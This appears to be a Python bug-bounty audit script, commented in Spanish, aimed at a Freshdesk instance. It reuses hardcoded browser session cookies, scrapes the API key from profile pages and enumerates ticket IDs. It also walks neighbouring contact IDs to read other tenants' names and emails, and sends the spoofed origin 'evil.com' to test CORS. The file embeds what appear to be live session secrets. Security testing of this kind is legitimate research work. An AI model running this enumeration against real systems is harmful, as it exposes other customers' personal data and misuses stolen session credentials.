#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
auditor_freshdesk.py — Auditoría IDOR para Freshdesk
======================================================
Usa las cookies de sesión del browser para autenticarse y testea:
  1. Extracción de API Key desde el perfil
  2. IDOR en tickets (IDs 1..50)
  3. IDOR en contactos y agentes
  4. Endpoints de la API v2

Uso: python3 auditor_freshdesk.py
"""

import requests
import json
import re
import sys

# ─────────────────────────────────────────────────────────────────────────────
# CONFIGURACIÓN — Actualizar con las cookies actuales
# ─────────────────────────────────────────────────────────────────────────────
TARGET      = "https://wearehackerone5431.freshdesk.com"
API_KEY     = None  # Se intenta extraer automáticamente del perfil

HELPKIT_SESSION   = "clZ1RDIyenZRUXRGMG1WZkVveHZTdERGTHZRUlBzV0FLWTQ1NzZWNURSVXkvSWUyakx1REJucFNEWmVETEJzZEE1SjhnYU0ycDc0czY5UWZ0RHRnN04wNlo0cmZDSUM0YnJaNmROQSs1dHJwekphMTA3UExxNExqOGNwK1NiZGlNeHpUUDhyTTFUdGd2N1lrQzRTdjJMd3FBUS80R3BzOTVFMm5hSExmbnVNYzF4WWswVjVkSnhkWkJEdFhaYUMvemYzcVhobW96NWhwZmdiYWhjTHBFSE5KdFJtU0V6ek9ReW9BbU5jQS9OY0RJcG1aY1dUbmVVaFhvbGJKb0h1bHlRVWJWSE5pNHJRWU40MmRDeFptdXhmUEM0b1RYeEtETzZOY3BOTmJqT0M0aWtCcmJFL0NWejc1MWxPa0hsWFVva3J5MCtBYmcvSXRWMmNsV1pzdFBaVXBlQUxOdVZYNXk2eEk1WkFmVE9HYmF3YzMzQXNyKzRDSTlzYy94L2xVbUR0SzllbVNZYndBSHFvd0pFaVJFS3puR08wWERVY1cvdGh2V2ZpazkwWXpsNGlUZlB2YnZ4OUg2T0JBN2I0WktKZUNRWkFyVmRtSTFaMVphTWRUeEszWlloRFNibzI1V283VnE2SWhhNUcyTmRpeUpmWld5TmlQNUlyNjM0cE5nL3kwajJXcVlkc0NSdzI1RGp1dVZ3PT0tLTEwN3MraVQvYXRsV2tlOWtsZEp1UWc9PQ%3D%3D--54e6fa891e5c4d7ad79522477f58deb5cc78ddf2"
USER_CREDS        = "BAhJIgGOZTE4YjYzZjIzMWI0YzBjNzU0ZDk3YWFkMTFlNTUyNjM0YWM0NDljNjVlMWYxNWYxMjYwNTljYzU4YWZiYmE3ZGVmNDYyYzMwMjU2ZGI5OGNlNDhkNzZlOGM4NmVhMGIxMTA1MGZhNDA3OGY0NTc5MDU2MDE0NGZjMzJhNjMwYmI6OjE1ODAxNDk4ODQwMgY6BkVU--4dcdc63ebb176b9449284a9d4dbfbaa8d7e1db1a"

HEADERS = {
    "User-Agent": "Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
    "X-Bug-Bounty": "HackerOne-tomas244",
    "Accept": "application/json, text/plain, */*",
    "Referer": TARGET,
}

COOKIES = {
    "_helpkit_session": HELPKIT_SESSION,
    "user_credentials": USER_CREDS,
}

# ─────────────────────────────────────────────────────────────────────────────
sess = requests.Session()
sess.headers.update(HEADERS)
sess.cookies.update(COOKIES)
sess.verify = True


def sep(titulo=""):
    print(f"\n{'─'*60}")
    if titulo:
        print(f"  {titulo}")
        print(f"{'─'*60}")


def check_auth():
    """Verifica que las cookies son válidas haciendo un request simple."""
    sep("1. VERIFICANDO AUTENTICACIÓN")
    r = sess.get(f"{TARGET}/a/tickets", allow_redirects=False)
    print(f"  GET /a/tickets → {r.status_code}")
    if r.status_code in [200, 302]:
        print("  ✅ Cookies válidas — sesión activa")
        return True
    else:
        print("  ❌ Sesión expirada o inválida. Renovar cookies.")
        return False


def extraer_api_key():
    """Intenta extraer la API key desde la página de perfil."""
    sep("2. EXTRAYENDO API KEY DEL PERFIL")
    for url_path in ["/a/profile", "/profile", "/helpdesk/profile"]:
        r = sess.get(f"{TARGET}{url_path}", allow_redirects=True)
        print(f"  GET {url_path} → {r.status_code}")
        if r.status_code == 200:
            # Buscar API key en el HTML (suele estar en un campo de texto o data attribute)
            patrones = [
                r'"api_key"\s*:\s*"([a-zA-Z0-9]+)"',
                r'api[_-]key["\s>:]+([a-zA-Z0-9]{20,})',
                r'data-api-key="([a-zA-Z0-9]+)"',
                r'"authToken"\s*:\s*"([a-zA-Z0-9]+)"',
            ]
            for patron in patrones:
                match = re.search(patron, r.text, re.IGNORECASE)
                if match:
                    key = match.group(1)
                    print(f"  ✅ API Key encontrada: {key}")
                    return key
            print(f"  ⚠️  Página cargó pero API key no encontrada en HTML")
    print("  ℹ️  No se pudo extraer API key — usando solo sesión")
    return None


def test_api_v2_con_sesion():
    """Testea endpoints de la API v2 usando la cookie de sesión."""
    sep("3. ENDPOINTS API v2 (con sesión)")
    endpoints = [
        "/api/v2/tickets",
        "/api/v2/contacts",
        "/api/v2/agents",
        "/api/v2/groups",
        "/api/v2/products",
        "/api/v2/roles",
        "/api/v2/settings/helpdesk",
    ]
    resultados = []
    for ep in endpoints:
        try:
            r = sess.get(f"{TARGET}{ep}", allow_redirects=False)
            status = r.status_code
            info = ""
            if status == 200:
                try:
                    data = r.json()
                    if isinstance(data, list):
                        info = f"✅  {len(data)} items — "
                        # Extraer IDs si existen
                        ids = [str(item.get("id","?")) for item in data[:5] if isinstance(item, dict)]
                        if ids:
                            info += f"IDs: {', '.join(ids)}"
                    elif isinstance(data, dict):
                        info = f"✅  dict con claves: {list(data.keys())[:5]}"
                except Exception:
                    info = f"✅  {len(r.text)} bytes (no-JSON)"
            elif status == 401:
                info = "🔒 Auth requerida — API key necesaria"
            elif status == 403:
                info = "🚫 Prohibido"
            elif status == 404:
                info = "❌ No encontrado"
            print(f"  {ep:40s} {status}  {info}")
            resultados.append({"endpoint": ep, "status": status, "info": info})
        except Exception as e:
            print(f"  {ep:40s} ERROR: {e}")
    return resultados


def test_idor_tickets():
    """Testea acceso a tickets por ID usando la sesión activa."""
    sep("4. IDOR EN TICKETS (IDs 1..20) — via sesión")
    # Usamos la sesión (cookies) que ya sabemos que funciona
    encontrados = []
    for ticket_id in range(1, 21):
        try:
            r = sess.get(f"{TARGET}/api/v2/tickets/{ticket_id}")
            if r.status_code == 200:
                data = r.json()
                subject = data.get("subject", "?")
                requester_id = data.get("requester_id", "?")
                print(f"  ✅ Ticket #{ticket_id}: '{subject[:50]}' — requester_id={requester_id}")
                encontrados.append(ticket_id)
            elif r.status_code == 404:
                print(f"  ⬜ Ticket #{ticket_id}: No existe (404)")
            elif r.status_code == 403:
                print(f"  🚨 Ticket #{ticket_id}: 403 Forbidden — POSIBLE IDOR BLOQUEADO")
            else:
                print(f"  ⚠️  Ticket #{ticket_id}: HTTP {r.status_code}")
        except Exception as e:
            print(f"  Ticket #{ticket_id}: ERROR {e}")
    return encontrados


def test_idor_contactos_vecinos(api_key):
    """
    Testea IDOR cross-tenant en contactos.
    Los IDs de contactos son GLOBALES (no por tenant).
    Si podemos acceder a IDs que no son nuestros → IDOR real.
    Nuestros IDs conocidos: 158015122423–158015122430
    Testeamos ±20 para intentar alcanzar contactos de otro tenant.
    """
    sep("5. IDOR CROSS-TENANT EN CONTACTOS (IDs vecinos)")
    print("  Nuestros IDs propios: 158015122423 – 158015122430")
    print("  Buscando IDs de OTROS tenants justo antes y después...\n")

    # Sesión sin cookies — solo API key — para auth limpia
    s = requests.Session()
    s.headers.update(HEADERS)
    s.auth = (api_key, "X")

    # Nuestro rango: 158015122423..158015122430
    # Testeamos 158015122410..158015122445
    NUESTROS = set(range(158015122423, 158015122431))
    rango_test = range(158015122410, 158015122446)

    hallazgos = []
    for cid in rango_test:
        try:
            r = s.get(f"{TARGET}/api/v2/contacts/{cid}")
            es_nuestro = "(nuestro)" if cid in NUESTROS else "⚠️  AJENO"
            if r.status_code == 200:
                data = r.json()
                nombre = data.get("name", "?")
                email = data.get("email", "?")
                marker = "🚨 IDOR CROSS-TENANT" if cid not in NUESTROS else "✅ propio"
                print(f"  [{cid}] {marker}: {nombre} / {email}")
                if cid not in NUESTROS:
                    hallazgos.append({"id": cid, "nombre": nombre, "email": email})
            elif r.status_code == 404:
                if cid not in NUESTROS:
                    print(f"  [{cid}] ⬜ No existe (404) {es_nuestro}")
            elif r.status_code == 403:
                print(f"  [{cid}] 🔒 403 — Acceso denegado {es_nuestro}")
            else:
                print(f"  [{cid}] HTTP {r.status_code} {es_nuestro}")
        except Exception as e:
            print(f"  [{cid}] ERROR: {e}")

    if hallazgos:
        print(f"\n  🚨🚨 IDOR CONFIRMADO: {len(hallazgos)} contactos ajenos accesibles!")
        for h in hallazgos:
            print(f"      → ID {h['id']}: {h['nombre']} / {h['email']}")
    else:
        print("\n  ✅ No se accedió a contactos de otros tenants en este rango")
    return hallazgos


def test_cors():
    """
    Testea CORS en endpoints con sesión (browser-facing).
    Vulnerabilidad real = ACAO refleja origin + ACAC: true
    ACAO: * solo en endpoints públicos NO es vulnerable.
    """
    sep("6. TEST CORS — Browser endpoints + API")
    origenes = ["https://evil.com", "https://attacker.freshdesk.com", "null"]

    # Endpoints que usan sesión (los importantes)
    endpoints_sesion = [
        "/api/v2/tickets",
        "/api/v2/contacts",
        "/api/v2/agents",
        "/api/v2/settings/helpdesk",
    ]

    print("  Leyenda: ACAO=Access-Control-Allow-Origin | ACAC=Allow-Credentials")
    print("  🚨 VULNERABLE = ACAO refleja origin O es * CON ACAC:true\n")

    for ep in endpoints_sesion:
        for origen in origenes[:1]:  # Solo evil.com para no saturar
            r = sess.get(f"{TARGET}{ep}", headers={"Origin": origen})
            acao = r.headers.get("Access-Control-Allow-Origin", "—")
            acac = r.headers.get("Access-Control-Allow-Credentials", "—")
            refleja = (acao == origen)
            wildcard_con_creds = (acao == "*" and acac == "true")
            vulnerable = refleja or wildcard_con_creds
            marker = "🚨 VULNERABLE" if vulnerable else ("⚠️  wildcard (sin ACAC)" if acao == "*" else "✅ OK")
            print(f"  {ep:40s} ACAO={acao:20s} ACAC={acac:6s} {marker}")


def main():
    print("=" * 60)
    print("  AUDITOR FRESHDESK — IDOR & CORS Tester")
    print(f"  Target: {TARGET}")
    print("=" * 60)

    # 1. Verificar auth
    if not check_auth():
        print("\n❌ Sesión inválida. Renovar cookies en el script.")
        sys.exit(1)

    # 2. Intentar extraer API key
    api_key = extraer_api_key()

    # 3. Testear endpoints API v2
    test_api_v2_con_sesion()

    # 4. IDOR en tickets (via sesión, que ya funciona)
    test_idor_tickets()

    # 5. IDOR cross-tenant en contactos (IDs vecinos)
    test_idor_contactos_vecinos(api_key)

    # 6. CORS (con detección correcta de ACAC)
    test_cors()

    sep("RESUMEN FINAL")
    print("  Revisá los ✅ y 🚨 arriba para priorizar próximos pasos.")
    print("  Si los tickets API devuelven 401 → necesitamos la API Key.")
    print("  Para obtenerla: en Freshdesk → Avatar → Profile → API Key")
    print("=" * 60)


if __name__ == "__main__":
    main()
